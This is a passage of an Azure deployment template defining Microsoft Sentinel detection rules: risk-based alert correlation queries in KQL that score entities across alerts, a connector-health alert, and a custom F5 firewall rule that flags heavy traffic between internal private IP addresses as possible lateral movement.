          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-9380: [Health] - Silent - XDR Connector offline {{bv_src_dvc}}",
            "alertDescriptionFormat": "This alert identifies a Microsoft XDR connector that has not generated security incidents within the expected threshold. \n{{ExtendedDescription}} \nCategory: Sentinel Usage \n{{Tags}}\n{{bv_rule_combined_string}}"
          },
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-912')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-912')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-912: [RBA] BlueVoyant RBA - Entity Analysis",
          "description": "This rule identifies aggregated behaviors by entity that should be further investigated MITRE: T1059 Category: BVIM tag: RBA",
          "severity": "Informational",
          "enabled": true,
          "query": "let desc_gen = (T: (*), ttype:string){\n  T\n  | extend a = pack_all()\n  | extend t = tostring(a[ttype])\n  | extend t = replace('\\n', '@new_line@',t)\n  | extend ot = extract_all(@'(\\[.*?\\])',t)\n  | mv-apply o = ot on (\n      parse o with * '~' k'~' *\n      | extend v = todynamic(a[k])\n      | extend v = iff(gettype(v) !='array', pack_array(v), v)\n      | extend r = iff(isempty(v) or (array_length(v) == 1 and (isempty(v[0]) or v[0] == 0) or array_length(v)==0),'',o)\n      | extend r = trim_end(@'\\]',r)\n      | extend r = trim_start(@'\\[.*~',r)\n      | summarize otr =make_list(r)\n  )\n  | extend tr = replace_strings(t, ot, otr )\n  | extend sdk = extract_all(@'(<bv_[\\w_]*>)',tr)\n  | extend gk = extract_all(@'(<g_bv_[\\w_]*>)',tr)\n  | mv-apply g = gk on (\n      parse g with '<g_' key '_p' *\n      | parse g with * '_p_' verb '>'\n      | extend v = a[key]\n      | extend ip = (gettype(v) == 'array' and array_length(v) > 1) or toint(v)>1\n      | extend r = case (\n          isempty(verb) and not(ip), ''\n          , isempty(verb) and ip, 's'\n          , verb == 'was' and (not(ip) or isempty(ip)), 'was'\n          , verb == 'was' and ip, 'were'\n          , verb == 'this' and ip, 'these'\n          , verb == 'this' and not(ip), 'this'\n          , verb == 'is' and (not(ip) or isempty(ip)), 'is'\n          , verb == 'is' and ip, 'are'\n      ,''\n      )\n      | summarize gr = make_list(r)\n  )\n  | mv-apply k = sdk on (\n      parse k with '<' key '>'\n      | extend v = todynamic(tostring(a[key]))\n      | extend v = iff(gettype(v) != 'array', pack_array(v), v)\n      | extend vl = array_length(v)\n      | extend r = case(\n          vl == 1, v[0]\n          , vl == 2, strcat(v[0], ' and ', v[1])\n          ,vl  > 2, strcat(v[0], ', ', v[1], ', and ', vl-2, ' others')\n          ,'')\n  | summarize r = make_list(r))\n  | extend dr = replace_strings(tr, sdk, r)\n  | extend dr = replace_strings(dr, gk, gr)\n  | extend dr = replace('@new_line@', '\\n',dr)\n  | extend hd = coalesce(a['desc_gen'],dynamic({}))\n  | extend desc_gen = bag_set_key(hd, ttype, dr)\n};\nlet empty_deployed_alerts = datatable(bv_rule_signature:string,bv_rule_id:string,bv_rule_signature_s:string)[];\nlet alert_names = (union isfuzzy=true\n  empty_deployed_alerts\n  ,(\n    SentinelDeployedAlerts_CL\n    | where TimeGenerated > ago(14d)\n    | parse DisplayName_s with bv_rule_id ':' * '-' bv_rule_signature_s\n    | sort by TimeGenerated desc\n    | summarize \n        arg_max(TimeGenerated, DisplayName_s)\n        , alert_name = make_set(bv_rule_signature_s) by bv_rule_id\n    | project \n        bv_rule_signature = DisplayName_s\n        , bv_rule_id\n        , bv_rule_signature_s=tostring(alert_name[0])\n    )\n);\nlet alert_id = 'BV-912';\nlet start_time = 1h;\nlet start_time_historical = 7d;\nlet start_time_suppress = 12h;\nlet end_time = now();\nlet global_config = dynamic({'THRESHOLD': 4});\nlet bv_alarm_threshold = coalesce(BV912_CONFIG['THRESHOLD'], global_config['THRESHOLD']);\nlet excluded_description_fields = dynamic(['bv_rule_metrics']);\nSecurityAlert\n| where TimeGenerated > ago(start_time_historical) and TimeGenerated < end_time\n| project TimeGenerated, AlertName, Description,ExtendedProperties,SystemAlertId\n| parse AlertName with RuleId ': [' Class '] ' Product ' - ' RuleName\n| where isnotempty(RuleId) and RuleId !in~ (BV911_CONFIG_GLOBAL.EXCLUDED_RULES)\n| extend custom_details =todynamic(tostring(todynamic(ExtendedProperties)['Custom Details']))\n| extend \n    VE = todynamic(tostring(todynamic(tostring(custom_details.VictimEntity))[0]))\n    , AE = todynamic(tostring(todynamic(tostring(custom_details.AttackerEntity))[0]))\n    , RS = todynamic(tostring(todynamic(tostring(custom_details.RBAScore))[0]))\n    , DH = todynamic(tostring(custom_details.bv_dedup_hash))[0]\n    , BI= todynamic(tostring(custom_details.bv_behavior_id))[0]\n| extend \n    AE = iff(gettype(AE) != 'array' and isnotempty(AE), pack_array(AE), AE)\n    , VE = iff(gettype(VE) != 'array' and isnotempty(VE), pack_array(VE), VE)\n| extend E = array_concat(AE, VE)\n| mv-expand E to typeof(string)\n| where \n    isnotempty(E) \n    and E !in ('root','-', 'administrator') \n    and isempty(ipv6_compare(E,'127.0.0.1')) \n| extend \n    bv_entity = tolower(iff(isnotempty(bv_cim_normalize_username(E)), bv_cim_normalize_username(E), E))\n    , DE = extract(@'(.*)\\n',0,Description)\n    , RS = iff(isempty(RS), 1.0, RS)\n    , D = datetime_diff('Day', now(),TimeGenerated)\n    , MATID = tostring(extract_all(@' (T\\d\\d\\d\\d) ',Description)[0])\n| extend DedupHash = case(\n    isnotempty(BI), BI\n    , isnotempty (DH), DH\n    , hash_sha1(strcat(RuleId, MATID))\n)\n| extend DF = pow(2, -(D)) \n| extend WScore = RS * DF\n| extend DH = case(\n            isnotempty(BI), BI\n            , isnotempty (DH), DH\n            , hash_sha1(strcat(RuleId, MATID))\n        )\n| summarize\n          bv_start_time=min(TimeGenerated)\n          , bv_end_time=max(TimeGenerated) \n          , bv_duplicate_alert_count=count()\n          , MaxWScore = max(WScore)\n          , MaxRBAScore = max(RS)\n          , bv_connector = make_set(Product)\n          , SystemAlertIds=make_set(SystemAlertId,5)\n          , MT = make_set(MATID)\n          , DS = take_any(DE)\n          , S = take_any(RuleName)\n          , bv_weighted_score = max(WScore)\n      by \n        bv_entity\n        , bv_dedup_hash = DH\n        , bv_rule_id = RuleId\n| join kind=leftouter alert_names on bv_rule_id\n| extend WeightedLength = iff(MaxWScore > 0.0, 1.0, 0.0)\n| extend PercentOfMax = MaxWScore/10\n| sort by bv_entity, MaxWScore asc, WeightedLength asc\n| extend CurrentLength = row_cumsum(WeightedLength, bv_entity != prev(bv_entity))\n| extend Weight = CurrentLength / (CurrentLength + 1.0)\n| scan declare (runningTotal:decimal=decimal(0.0), step:string='') with \n(\n    step previousRow: true => runningTotal = iff(bv_entity == previousRow.bv_entity, (previousRow.runningTotal + (10.0-previousRow.runningTotal) * PercentOfMax * Weight),todecimal(10.0 * PercentOfMax * Weight ));\n)\n| summarize \n        bv_start_time=min(bv_start_time) \n        , bv_end_time=max(bv_end_time)\n        , bv_event_count=sum(bv_duplicate_alert_count)\n        , MT=make_set(MT)\n        , bv_alarm_value=max(runningTotal) \n        , bv_connector = make_set(bv_connector,5)\n        , bv_alert_id=make_set(SystemAlertIds,5)\n        , bv_rule_count = count()\n        , rule_total = sum(bv_duplicate_alert_count)\n        , bv_alert_description_s = take_any(DS)\n        , bv_alert_signature_s = take_any(S)\n        , max_score = max(MaxRBAScore)\n        , bv_weighted_score = max(bv_weighted_score)\n    by \n        bv_entity\n        , bv_rule_id\n        , bv_rule_signature\n        , bv_rule_signature_s\n| extend bv_alarm_threshold = bv_alarm_threshold\n| extend duplicate_count = rule_total - bv_rule_count\n| extend bv_rule_metrics = bag_pack(\n        'rule_id',bv_rule_id\n        ,'total_count',rule_total\n        ,'unique_count',bv_rule_count\n        ,'duplicate_count',duplicate_count\n        ,'max_score',max_score\n        , 'alert_description', bv_alert_description_s\n        , 'alert_signature', bv_alert_signature_s\n        , 'weighted_max', bv_weighted_score\n        , 'alert_ids', bv_alert_id\n        , 'rule_signature', bv_rule_signature_s)\n| summarize \n    bv_start_time=min(bv_start_time) \n    , bv_end_time=max(bv_end_time)\n    , bv_event_count=sum(bv_event_count)\n    , bv_mitre_technique_id=make_set(MT)\n    , bv_alarm_value=max(bv_alarm_value) \n    , bv_connector = make_set(bv_connector,20)\n    , bv_alert_id=make_set(bv_alert_id,20)\n    , bv_rule_metrics = make_set(bv_rule_metrics)\nby bv_entity\n| where bv_alarm_value >= toreal(bv_alarm_threshold)        \n| extend bv_rule_metrics = array_reverse(bv_rule_metrics)\n| extend \n    R0 = bv_rule_metrics[0]\n    , R1 = bv_rule_metrics[1]\n| extend \n        bv_d_rs1 = R0['rule_signature']\n        , bv_d_rs2 = R1['rule_signature']\n        , bv_d_ri1 = R0['rule_id']\n        , bv_d_ri2 = R1['rule_id']\n        , bv_d_am1 = R0['weighted_max']\n        , bv_d_am2 = R1['weighted_max']\n        , bv_d_ac1 = R0['total_count']\n        , bv_d_ac2 = R1['total_count']\n        , bv_d_sc = array_length(bv_rule_metrics)\n        , bv_d_ad1 = R0['alert_description']\n        , bv_d_ad2 = R1['alert_description']\n        , bv_d_as1 = R0['alert_signature']\n        , bv_d_as2 = R1['alert_signature']\n        , bv_alarm_value = round(bv_alarm_value,2)\n| mv-apply m = bv_rule_metrics on (\n    extend s = strcat('* ', m.rule_id,' ',trim('\\n',tostring(m.rule_signature)),' (count: ',m.total_count, ')\\n')\n    | summarize s = make_set(s), bv_alert_id=make_set(m.alert_ids), bv_rule_ids = make_set(m.rule_id)\n)\n| extend \n    bv_d_s = strcat_array(s,'')\n    , bv_d_tc = iff(bv_d_sc < 3, int(null), bv_d_sc - 2)\n    , bv_alarm_value = round(bv_alarm_value,2)\n    , alert_id_temp = alert_id\n    , bv_rule_ids = array_sort_asc(bv_rule_ids)\n| extend bv_agg_behavior_hash = hash_sha1(tostring(bv_rule_ids))\n| lookup bv_desc_temp on alert_id_temp\n| invoke desc_gen('long_template')\n| invoke desc_gen('short_template')\n| extend\n          bv_desc_l = desc_gen['long_template']\n          , bv_desc_s =desc_gen['short_template']\n          , MitreString = strcat('MITRE: ', strcat_array(bv_mitre_technique_id, '\\nMITRE: '))\n| extend bv_rule_version = '1.6.4523'\n| extend bv_rule_timestamp = '1701352333.4490817'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.6.4523 bv_rule_timestamp: 1701352333.4490817'    \n| project-away bv_d_*\n| project-keep\n    bv_*\n    , MitreString",
          "queryFrequency": "PT1H",
          "queryPeriod": "P7D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl",
            "Execution"
          ],
          "techniques": [
            "T1059"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-912: [RBA] {{bv_desc_s}}",
            "alertDescriptionFormat": "{{bv_desc_l}}\n\nCategory: Security Alert Correlation  \ntag: RBA\n{{MitreString}}  \n{{bv_rule_combined_string}}"
          },
          "customDetails": {
            "Score": "bv_alarm_value",
            "Entity": "bv_entity",
            "RuleMetrics": "bv_rule_metrics",
            "bv_agg_behavior_hash": "bv_agg_behavior_hash",
            "RuleId": "bv_rule_ids",
            "Mitre": "bv_mitre_technique_id",
            "Connectors": "bv_connector",
            "SystemAlertIds": "bv_alert_id"
          },
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-911')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-911')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-911: [SOC] BlueVoyant RBA - Entity Aggregated Behavior Incident",
          "description": "This rule identifies aggregated behaviors by entity that should be further investigated MITRE: T1059 Category: BVIM tag: SOC",
          "severity": "Medium",
          "enabled": true,
          "query": "let description = (table_parameter: (*), excluded_fields:dynamic=dynamic(['']), max_field_length:int=300, max_array_length:int=5){\n    table_parameter\n    | extend all_data = pack_all()\n    | extend keys = bag_keys(all_data)\n    | mv-apply k = keys to typeof(string) on (\n        extend dynamic_entity = todynamic(trim(' ',tostring(all_data[k])))\n        | extend ExtendedDescription = iff(k startswith 'bv_' and k != 'bv_raw' and not(k has_any (excluded_fields)), strcat(\n            case(gettype(dynamic_entity) == 'array' and isnotempty(array_sort_desc(dynamic_entity)[0]) and array_length(dynamic_entity) > 1 , strcat(k, ': \\n* ', substring(strcat_array(array_slice(dynamic_entity,0,(max_array_length-1)),'\\n* '),0,max_field_length), '\\n')\n            , gettype(dynamic_entity) != 'array' and isnotempty(array_sort_desc(pack_array(tostring(all_data[k])))[0]), strcat(k,': ', dynamic_entity)\n            , gettype(dynamic_entity) == 'array' and array_length(dynamic_entity) == 1, strcat(k,': ', dynamic_entity[0])\n            , '')\n            ),'')\n            | summarize ExtendedDescription = make_set(ExtendedDescription)\n    )\n    | extend ExtendedDescription=strcat_array(ExtendedDescription, \"\\n \")\n};\nlet desc_gen = (T: (*), ttype:string){\n  T\n  | extend a = pack_all()\n  | extend t = tostring(a[ttype])\n  | extend t = replace('\\n', '@new_line@',t)\n  | extend ot = extract_all(@'(\\[.*?\\])',t)\n  | mv-apply o = ot on (\n      parse o with * '~' k'~' *\n      | extend v = todynamic(a[k])\n      | extend v = iff(gettype(v) !='array', pack_array(v), v)\n      | extend r = iff(isempty(v) or (array_length(v) == 1 and (isempty(v[0]) or v[0] == 0) or array_length(v)==0),'',o)\n      | extend r = trim_end(@'\\]',r)\n      | extend r = trim_start(@'\\[.*~',r)\n      | summarize otr =make_list(r)\n  )\n  | extend tr = replace_strings(t, ot, otr )\n  | extend sdk = extract_all(@'(<bv_[\\w_]*>)',tr)\n  | extend gk = extract_all(@'(<g_bv_[\\w_]*>)',tr)\n  | mv-apply g = gk on (\n      parse g with '<g_' key '_p' *\n      | parse g with * '_p_' verb '>'\n      | extend v = a[key]\n      | extend ip = (gettype(v) == 'array' and array_length(v) > 1) or toint(v)>1\n      | extend r = case (\n          isempty(verb) and not(ip), ''\n          , isempty(verb) and ip, 's'\n          , verb == 'was' and (not(ip) or isempty(ip)), 'was'\n          , verb == 'was' and ip, 'were'\n          , verb == 'this' and ip, 'these'\n          , verb == 'this' and not(ip), 'this'\n          , verb == 'is' and (not(ip) or isempty(ip)), 'is'\n          , verb == 'is' and ip, 'are'\n      ,''\n      )\n      | summarize gr = make_list(r)\n  )\n  | mv-apply k = sdk on (\n      parse k with '<' key '>'\n      | extend v = todynamic(tostring(a[key]))\n      | extend v = iff(gettype(v) != 'array', pack_array(v), v)\n      | extend vl = array_length(v)\n      | extend r = case(\n          vl == 1, v[0]\n          , vl == 2, strcat(v[0], ' and ', v[1])\n          ,vl  > 2, strcat(v[0], ', ', v[1], ', and ', vl-2, ' others')\n          ,'')\n  | summarize r = make_list(r))\n  | extend dr = replace_strings(tr, sdk, r)\n  | extend dr = replace_strings(dr, gk, gr)\n  | extend dr = replace('@new_line@', '\\n',dr)\n  | extend hd = coalesce(a['desc_gen'],dynamic({}))\n  | extend desc_gen = bag_set_key(hd, ttype, dr)\n};\nlet empty_deployed_alerts = datatable(bv_rule_signature:string,bv_rule_id:string,bv_rule_signature_s:string)[];\nlet alert_names = (union isfuzzy=true\n  empty_deployed_alerts\n  ,(\n    SentinelDeployedAlerts_CL\n    | where TimeGenerated > ago(14d)\n    | parse DisplayName_s with bv_rule_id ':' * '-' bv_rule_signature_s\n    | sort by TimeGenerated desc\n    | summarize\n        arg_max(TimeGenerated, DisplayName_s)\n        , alert_name = make_set(bv_rule_signature_s) by bv_rule_id\n| project\n        bv_rule_signature = DisplayName_s\n        , bv_rule_id\n        , bv_rule_signature_s=tostring(alert_name[0])\n    )\n);\nlet alert_id = 'BV-911';\nlet start_time = 1h;\nlet start_time_historical = 7d;\nlet start_time_suppress = 12h;\nlet global_config = dynamic({\n    'THRESHOLD': 7\n    , 'EXCLUDED_ACCOUNT': dynamic(['root','-','administrator','admin'])\n    , 'EXCLUDED_USER_REGEX': @'EXCLUDED_USER_REGEX'\n    , 'EXCLUDED_SIGNATURE': dynamic(['Phish delivered due to an IP allow policy', 'Phish delivered due to an ETR override', 'Email messages containing', 'Email reported by user as junk','Email messages from a campaign removed after delivery\u00e2\u20ac\u2039','Defender for Endpoints'])\n});\nlet bv_alarm_threshold = coalesce(BV911_CONFIG['THRESHOLD'], global_config['THRESHOLD']);\nlet excluded_description_fields = dynamic(['bv_rule_metrics']);\nlet excluded_user = strcat(global_config['EXCLUDED_USER_REGEX'], \n    iff(isnotempty(BV911_CONFIG.EXCLUDED_USER_REGEX),strcat('| ', BV911_CONFIG.EXCLUDED_USER_REGEX),''));   \nSecurityAlert\n| where TimeGenerated > ago(start_time_historical)\n| project TimeGenerated, AlertName, Description,ExtendedProperties,SystemAlertId\n| parse AlertName with RuleId ': [' Class '] ' Product ' - ' RuleName\n| where isnotempty(RuleId) and RuleId !in~ (BV911_CONFIG_GLOBAL.EXCLUDED_RULES)\nand not(AlertName has_any (global_config['EXCLUDED_SIGNATURE']))\n| extend custom_details =todynamic(tostring(todynamic(ExtendedProperties)['Custom Details']))\n| extend\n    VE = todynamic(tostring(todynamic(tostring(custom_details.VictimEntity))[0]))\n    , AE = todynamic(tostring(todynamic(tostring(custom_details.AttackerEntity))[0]))\n    , RS = todynamic(tostring(todynamic(tostring(custom_details.RBAScore))[0]))\n    , DH = todynamic(tostring(custom_details.bv_dedup_hash))[0]\n    , BI= todynamic(tostring(custom_details.bv_behavior_id))[0]\n| extend\n    AE = iff(gettype(AE) != 'array' and isnotempty(AE), pack_array(AE), AE)\n    , VE = iff(gettype(VE) != 'array' and isnotempty(VE), pack_array(VE), VE)\n| extend E = array_concat(AE, VE)\n| mv-expand E to typeof(string)\n| where\n    isnotempty(E)\n    and isempty(ipv6_compare(E,'127.0.0.1')) and E !in~ (global_config['EXCLUDED_ACCOUNT'])\n        and E matches regex tostring(excluded_user) == false\n| extend\n    bv_entity = tolower(iff(isnotempty(bv_cim_normalize_username(E)), bv_cim_normalize_username(E), E))\n    , DE = extract(@'(.*)\\n',0,Description)\n    , RS = iff(isempty(RS), 1.0, RS)\n    , D = datetime_diff('Day', now(),TimeGenerated)\n    , MATID = tostring(extract_all(@' (T\\d\\d\\d\\d) ',Description)[0])\n| extend DedupHash = case(\n    isnotempty(BI), BI\n    , isnotempty (DH), DH\n    , hash_sha1(strcat(RuleId, MATID))\n)\n| extend DF = pow(2, -(D))\n| extend WScore = RS * DF\n| extend DH = case(\n            isnotempty(BI), BI\n            , isnotempty (DH), DH\n            , hash_sha1(strcat(RuleId, MATID))\n        )\n| summarize\n          bv_start_time=min(TimeGenerated)\n          , bv_end_time=max(TimeGenerated)\n          , bv_duplicate_alert_count=count()\n          , MaxWScore = max(WScore)\n          , MaxRBAScore = max(RS)\n          , bv_connector = make_set(Product)\n          , SystemAlertIds=make_set(SystemAlertId,5)\n          , MT = make_set(MATID)\n          , DS = take_any(DE)\n          , S = take_any(RuleName)\n          , bv_weighted_score = max(WScore)\n          , bv_entity_original = make_set(E)\n      by\n        bv_entity\n        , bv_dedup_hash = DH\n        , bv_rule_id = RuleId\n| join kind=leftouter alert_names on bv_rule_id\n| extend WeightedLength = iff(MaxWScore > 0.0, 1.0, 0.0)\n| extend PercentOfMax = MaxWScore/10\n| sort by bv_entity, MaxWScore asc, WeightedLength asc\n| extend CurrentLength = row_cumsum(WeightedLength, bv_entity != prev(bv_entity))\n| extend Weight = CurrentLength / (CurrentLength + 1.0)\n| scan declare (runningTotal:decimal=decimal(0.0), step:string='') with\n(\n    step previousRow: true => runningTotal = iff(bv_entity == previousRow.bv_entity, (previousRow.runningTotal + (10.0-previousRow.runningTotal) * PercentOfMax * Weight),todecimal(10.0 * PercentOfMax * Weight ));\n)\n| summarize\n        bv_start_time=min(bv_start_time)\n        , bv_end_time=max(bv_end_time)\n        , bv_event_count=sum(bv_duplicate_alert_count)\n        , MT=make_set(MT)\n        , bv_alarm_value=max(runningTotal)\n        , bv_connector = make_set(bv_connector,5)\n        , bv_alert_id=make_set(SystemAlertIds,5)\n        , bv_rule_count = count()\n        , rule_total = sum(bv_duplicate_alert_count)\n        , bv_alert_description_s = take_any(DS)\n        , bv_alert_signature_s = take_any(S)\n        , max_score = max(MaxRBAScore)\n        , bv_weighted_score = max(bv_weighted_score)\n        , bv_entity_original = make_set(bv_entity_original)              \n    by\n        bv_entity\n        , bv_rule_id\n        , bv_rule_signature\n        , bv_rule_signature_s\n| extend bv_alarm_threshold = bv_alarm_threshold\n| extend duplicate_count = rule_total - bv_rule_count\n| extend bv_rule_metrics = bag_pack(\n        'rule_id',bv_rule_id\n        ,'total_count',rule_total\n        ,'unique_count',bv_rule_count\n        ,'duplicate_count',duplicate_count\n        ,'max_score',max_score\n        , 'alert_description', bv_alert_description_s\n        , 'alert_signature', bv_alert_signature_s\n        , 'weighted_max', bv_weighted_score\n        , 'alert_ids', bv_alert_id\n        , 'rule_signature', bv_rule_signature_s)\n| sort by bv_weighted_score desc        \n| summarize\n    bv_start_time=min(bv_start_time)\n    , bv_end_time=max(bv_end_time)\n    , bv_event_count=sum(bv_event_count)\n    , bv_mitre_technique_id=make_set(MT)\n    , bv_alarm_value=max(bv_alarm_value)\n    , bv_connector = make_set(bv_connector,20)\n    , bv_alert_id=make_set(bv_alert_id,20)\n    , bv_rule_metrics = make_list(bv_rule_metrics)\n    , bv_rule_metrics_non_zero = countif(bv_rule_metrics.max_score > 0)\n    , bv_entity_original = make_set(bv_entity_original)          \nby bv_entity\n| where bv_rule_metrics_non_zero > 2\n| where bv_alarm_value >= toreal(bv_alarm_threshold)       \n| invoke description(excluded_description_fields)\n| extend\n    R0 = bv_rule_metrics[0]\n    , R1 = bv_rule_metrics[1]\n| extend\n        bv_d_rs1 = R0['rule_signature']\n        , bv_d_rs2 = R1['rule_signature']\n        , bv_d_ri1 = R0['rule_id']\n        , bv_d_ri2 = R1['rule_id']\n        , bv_d_am1 = R0['weighted_max']\n        , bv_d_am2 = R1['weighted_max']\n        , bv_d_ac1 = R0['total_count']\n        , bv_d_ac2 = R1['total_count']\n        , bv_d_sc = array_length(bv_rule_metrics)\n        , bv_d_ad1 = R0['alert_description']\n        , bv_d_ad2 = R1['alert_description']\n        , bv_d_as1 = R0['alert_signature']\n        , bv_d_as2 = R1['alert_signature']\n        , bv_alarm_value = round(bv_alarm_value,2)\n| mv-apply m = bv_rule_metrics on (\n    extend s = strcat('* ', m.rule_id,' ',trim('\\n',tostring(m.rule_signature)),' (count: ',m.total_count, ')\\n')\n    | summarize s = make_set(s), bv_alert_id=make_set(m.alert_ids), bv_rule_ids = make_set(m.rule_id)\n)\n| extend\n    bv_d_s = strcat_array(s,'')\n    , bv_d_tc = iff(bv_d_sc < 3, int(null), bv_d_sc - 2)\n    , bv_alarm_value = round(bv_alarm_value,2)\n    , alert_id_temp = alert_id\n    , bv_rule_ids = array_sort_asc(bv_rule_ids)\n| extend bv_agg_behavior_hash = hash_sha1(tostring(bv_rule_ids))\n| lookup bv_desc_temp on alert_id_temp\n| invoke desc_gen('long_template')\n| invoke desc_gen('short_template')\n| extend\n          bv_desc_l = desc_gen['long_template']\n          , bv_desc_s =desc_gen['short_template']\n          , MitreString = strcat('MITRE: ', strcat_array(bv_mitre_technique_id, '\\nMITRE: '))\n          , bv_dedup_hash = hash_sha1(strcat(alert_id,bv_entity))\n          , bv_mapping_tag = bv_entity\n| extend bv_encoded_cd = gzip_compress_to_base64_string(tostring(bag_pack('RuleMetrics', bv_rule_metrics, 'RuleId', bv_rule_ids, 'SystemAlertIds', bv_alert_id)))                 \n| where BV_FUN_DEDUP(alert_id, start_time_suppress) !has bv_dedup_hash\n| project-away bv_d_*\n| extend bv_rule_version = '1.9.5327'\n| extend bv_rule_timestamp = '1717602415.4637675'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.9.5327 bv_rule_timestamp: 1717602415.4637675'\n| project-keep\n    bv_*",
          "queryFrequency": "PT1H",
          "queryPeriod": "P7D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl",
            "Execution"
          ],
          "techniques": [
            "T1059"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-911: [SOC] {{bv_desc_s}}",
            "alertDescriptionFormat": "{{bv_desc_l}}\n\nCategory: Security Alert Correlation  \ntag: SOC\n{{bv_rule_combined_string}}"
          },
          "customDetails": {
            "bv_dedup_hash": "bv_dedup_hash",
            "Score": "bv_alarm_value",
            "Entity": "bv_entity",
            "bv_encoded_cd": "bv_encoded_cd",
            "bv_agg_behavior_hash": "bv_agg_behavior_hash",
            "Mitre": "bv_mitre_technique_id",
            "Connectors": "bv_connector",
            "bvtag": "bv_mapping_tag"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "bv_entity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/054ded48-597c-425c-9d03-2f840d65b459')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/054ded48-597c-425c-9d03-2f840d65b459')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "[DCSS Custom] F5_AFM_Lateral Movement Detection",
          "description": "This query detects instances where there is a high volume of communication between private IP addresses within DCSS's network. It focuses on identifying excessive traffic flows within private address spaces (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16) over a 30-minute window. \n\nThe rule is designed to highlight potential anomalies such as:\n\n- Lateral movement within the network.\n- Unusual internal scanning activities.\n- Possible data exfiltration attempts.\n- Compromised internal hosts communicating abnormally.",
          "severity": "Medium",
          "enabled": true,
          "query": "// Traffic from F5 to Web App is expected: 10.200.0.27 - F5 - 10.200.0.28 - F5, 10.200.17.82 - vmprodapp15, 10.200.17.75 - vmprodapp08, 10.200.17.74 - vmprodapp07, 10.200.17.83 - vmprodapp16   \nF5Telemetry_AFM_CL\n| where TimeGenerated > ago(30m)\n| where (source_ip_s startswith \"10.\" \n         or source_ip_s matches regex @\"^172\\.(1[6-9]|2[0-9]|3[0-1])\\.\" \n         or source_ip_s startswith \"192.168.\")\n    and (dest_ip_s startswith \"10.\" \n         or dest_ip_s matches regex @\"^172\\.(1[6-9]|2[0-9]|3[0-1])\\.\" \n         or dest_ip_s startswith \"192.168.\")\n| summarize count() by source_ip_s, dest_ip_s\n| where count_ > 50\n\n",
          "queryFrequency": "PT5H",
          "queryPeriod": "PT5H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-1623')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-1623')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
